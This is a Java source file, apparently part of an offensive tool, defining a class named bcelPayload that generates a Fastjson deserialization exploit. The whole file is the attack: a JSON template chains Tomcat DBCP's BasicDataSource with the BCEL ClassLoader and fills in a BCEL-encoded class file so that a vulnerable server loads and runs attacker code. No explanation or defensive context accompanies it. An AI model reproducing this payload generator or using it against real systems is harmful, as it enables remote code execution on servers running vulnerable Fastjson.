package com.ding0x0.fastjson;

import com.ding0x0.Payload;
import com.ding0x0.utils.BCEL;
import com.ding0x0.utils.Stream;

import java.io.IOException;

public class bcelPayload extends Payload {

    public String bcel = "";
    public String template = "[+] dbcp" +
            "   {\n" +
            "       {\n" +
            "           \"x\":{\n" +
            "                   \"fwname\":{\n" +
            "                   \"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
            "                   \"driverClassLoader\":{\n" +
            "                       \"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
            "                   },\n" +
            "                   \"driverClassName\":\"%s\"\n" +
            "               }\n" +
            "           }\n" +
            "       }:\"x\"\n" +
            "   }";

    public bcelPayload(String bcel){
        this.bcel = bcel;
    }

    public bcelPayload(){

    }

    @Override
    public String format() throws IOException {
        if (this.bcel.equals("")) {
            return String.format(this.template, "$$BCEL$$");
        }
        return String.format(this.template, BCEL.encode(Stream.F2B(this.bcel)));
    }
}
